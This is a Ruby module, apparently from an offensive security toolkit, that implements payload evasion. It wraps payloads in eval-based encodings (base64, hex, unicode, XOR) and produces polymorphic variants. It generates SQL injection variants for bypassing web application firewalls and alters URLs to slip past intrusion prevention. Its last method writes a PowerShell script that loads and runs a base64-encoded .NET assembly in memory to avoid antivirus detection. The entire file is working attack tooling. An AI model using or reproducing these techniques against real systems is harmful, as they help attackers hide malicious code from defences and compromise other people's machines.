require 'base64'
require 'uri'
require_relative '../utils/colorize'

class Evasion
  def self.obfuscate_payload(payload, method = 'base64')
    case method
    when 'base64'
      encoded = Base64.strict_encode64(payload)
      "eval(base64_decode('#{encoded}'))"
    when 'hex'
      hex = payload.bytes.map { |b| "\\x#{b.to_s(16).rjust(2, '0')}" }.join
      "eval(\"#{hex}\")"
    when 'unicode'
      unicode = payload.codepoints.map { |c| "\\u#{c.to_s(16).rjust(4, '0')}" }.join
      "eval(\"#{unicode}\")"
    when 'rot13'
      payload.tr('A-Za-z', 'N-ZA-Mn-za-m')
    when 'xor'
      key = rand(1..255)
      xored = payload.bytes.map { |b| (b ^ key).chr }.join
      "eval(xor_decode('#{Base64.strict_encode64(xored)}', #{key}))"
    when 'double_encode'
      URI.encode_www_form_component(URI.encode_www_form_component(payload))
    when 'unicode_escape'
      payload.bytes.map { |b| "\\u#{b.to_s(16).rjust(4, '0')}" }.join
    else
      payload
    end
  end

  def self.generate_polymorphic_payload(base_payload)
    variants = []
    
    variants << obfuscate_payload(base_payload, 'base64')
    variants << obfuscate_payload(base_payload, 'hex')
    variants << obfuscate_payload(base_payload, 'unicode')
    variants << obfuscate_payload(base_payload, 'rot13')
    variants << obfuscate_payload(base_payload, 'xor')
    variants << obfuscate_payload(base_payload, 'double_encode')
    
    variants
  end

  def self.generate_waf_bypass_payloads(original_payload)
    bypasses = []
    
    bypasses << original_payload.gsub(' ', '/**/')
    bypasses << original_payload.gsub(' ', '+')
    bypasses << original_payload.gsub(' ', '%20')
    bypasses << original_payload.gsub(' ', '%09')
    bypasses << original_payload.gsub(' ', '%0a')
    bypasses << original_payload.gsub(' ', '%0d')
    bypasses << original_payload.gsub(' ', '%0b')
    bypasses << original_payload.gsub(' ', '%a0')
    
    bypasses << original_payload.gsub("'", "''")
    bypasses << original_payload.gsub("'", "\\'")
    bypasses << original_payload.gsub("'", "%27")
    bypasses << original_payload.gsub("'", "char(39)")
    
    bypasses << original_payload.gsub('"', '""')
    bypasses << original_payload.gsub('"', '\\"')
    bypasses << original_payload.gsub('"', '%22')
    bypasses << original_payload.gsub('"', 'char(34)')
    
    bypasses << original_payload.gsub('=', ' LIKE ')
    bypasses << original_payload.gsub('=', '=')
    bypasses << original_payload.gsub('=', '%3d')
    
    bypasses << original_payload.gsub('OR', 'Or')
    bypasses << original_payload.gsub('OR', 'oR')
    bypasses << original_payload.gsub('OR', '||')
    bypasses << original_payload.gsub('AND', '&&')
    
    bypasses.uniq
  end

  def self.generate_ips_evasion(original_payload)
    evasions = []
    
    evasions << original_payload.gsub('.', '[.]')
    evasions << original_payload.gsub('.', '(.)')
    evasions << original_payload.gsub('.', '{.}')
    evasions << original_payload.gsub('.', 'dot')
    evasions << original_payload.gsub('.', 'DOT')
    evasions << original_payload.gsub('.', '0x2e')
    
    evasions << original_payload.gsub('http://', 'hxxp://')
    evasions << original_payload.gsub('http://', 'http:\\\\')
    evasions << original_payload.gsub('http://', 'http://')
    
    evasions.uniq
  end

  def self.generate_av_evasion(payload)
    evasion = <<~PS1
      $payload = '#{Base64.strict_encode64(payload)}'
      $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
      $bytes = [System.Convert]::FromBase64String($decoded)
      $assembly = [System.Reflection.Assembly]::Load($bytes)
      $entryPoint = $assembly.GetType('Program').GetMethod('Main')
      $entryPoint.Invoke($null, @())
    PS1
    
    filename = "av_evasion_#{Time.now.to_i}.ps1"
    File.write(filename, evasion)
    puts Colorize.green("AV evasion script saved: #{filename}")
    filename
  end
end

